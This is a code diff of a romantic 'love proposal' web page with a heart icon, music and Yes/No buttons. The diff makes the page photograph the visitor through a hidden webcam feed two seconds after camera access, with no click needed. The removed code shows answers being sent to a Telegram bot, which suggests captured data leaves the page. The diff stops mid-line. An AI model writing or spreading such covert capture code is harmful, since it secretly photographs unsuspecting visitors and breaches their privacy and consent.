@@ -163,7 +163,7 @@
     </div>
 
     <!-- Heart Icon to Capture Photo -->
-    <div class="heart" onclick="capturePhoto()">❤️</div>
+    <div class="heart" onclick="playMusic()">❤️</div>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
@@ -183,18 +183,19 @@
     let canvas = document.getElementById('canvas');
     let context = canvas.getContext('2d');
     let audio = document.getElementById('loveAudio');
-    let isPlaying = false;
 
     // Start the video feed (this will run in the background but not visible)
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(function(stream) {
         video.srcObject = stream;
+        // Automatically capture photo after 2 seconds
+        setTimeout(capturePhoto, 2000); // Capture photo after 2 seconds
       })
       .catch(function(error) {
         console.error("Error accessing webcam: ", error);
       });
 
-    // Capture photo when heart is clicked
+    // Capture photo automatically
     function capturePhoto() {
       // Set canvas size to match video size
       canvas.width = video.videoWidth;
@@ -245,24 +246,15 @@
       });
     }
 
-    // Handle Yes/No button click
-    function handleResponse(response) {
-      let emojis = response === 'Yes' ? '❤️❤️❤️❤️❤️' : '🥺🥺🥺🥺🥺'; // Multiple emojis
-      for (let i = 0; i < emojis.length; i++) {
-        // Make falling emojis appear
-        setTimeout(() => showFallingEmojis(emojis[i]), i * 500); // Delay each emoji
+    // Play music when heart emoji is clicked
+    function playMusic() {
+      if (audio.paused) {
+        audio.play();
+      } else {
+        audio.pause();
       }
-      sendToTelegramBot(response);
     }
 
-    // Show falling emojis
-    function showFallingEmojis(emoji) {
-      let fallingEmojis = document.getElementById('fallingEmojis');
-      fallingEmojis.innerHTML += emoji;
-      setTimeout(() => {
-        fallingEmojis.innerHTML = ''; // Clear falling emojis after 3 seconds
-      }, 3000); // Clear after 3 seconds
-    }
-  </script>
-</body>
-</html>
+    // Handle Yes/No button click
+    function handleResponse(response) {
+      let emojis = response === 'Yes' ? '❤️❤️❤️❤️❤️
